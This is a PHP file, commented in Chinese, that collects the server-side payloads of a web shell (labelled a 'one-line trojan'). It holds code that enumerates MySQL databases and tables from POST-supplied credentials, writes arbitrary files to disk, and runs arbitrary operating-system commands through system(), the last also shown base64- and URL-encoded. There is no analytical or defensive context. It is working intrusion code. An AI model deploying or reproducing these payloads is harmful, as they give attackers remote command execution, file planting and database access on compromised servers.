<?php


// 数据库查询

// 一句话木马
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;$m=get_magic_quotes_gpc();
$hst=$m?stripslashes($_POST["z1"]):$_POST["z1"];
$usr=$m?stripslashes($_POST["z2"]):$_POST["z2"];
$pwd=$m?stripslashes($_POST["z3"]):$_POST["z3"];
$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query("SHOW DATABASES");
while($rs=@mysql_fetch_row($q)){echo(trim($rs[0]).chr(9));}
@mysql_close($T);;
echo("|<-");die(); 

// 数据表查询

@ini_set("display_errors","0");

@set_time_limit(0);@set_magic_quotes_runtime(0);

echo("->|");;$m=get_magic_quotes_gpc();

$hst=$m?stripslashes($_POST["z1"]):$_POST["z1"];
$usr=$m?stripslashes($_POST["z2"]):$_POST["z2"];
$pwd=$m?stripslashes($_POST["z3"]):$_POST["z3"];
$dbn=$m?stripslashes($_POST["z4"]):$_POST["z4"];

$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query("SHOW TABLES FROM `{$dbn}`");
while($rs=@mysql_fetch_row($q))
{
    echo(trim($rs[0]).chr(9));
}
@mysql_close($T);;
echo("|<-");die();


// 文件上传
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;
$f=base64_decode($_POST["z1"]);
$c=$_POST["z2"];$c=str_replace("\r","",$c);
$c=str_replace("\n","",$c);$buf="";
for($i=0;$i<strlen($c);
$i+=2)
$buf.=urldecode("".substr($c,$i,2));
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");;
echo("|<-");
die();


// shell 操作

QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt
Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2R
lKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJ
F9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcIns
kc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJld
Ck7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D

@ini_set("display_errors","0");
@set_time_limit(0);@set_magic_quotes_runtime(0);
echo("->|");;
$p=base64_decode($_POST["z1"]);
$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
$r="{$p} {$c}";@system($r." 2>&1",$ret);
print ($ret!=0)?"
ret={$ret}
":"";;
echo("|<-");die();
?>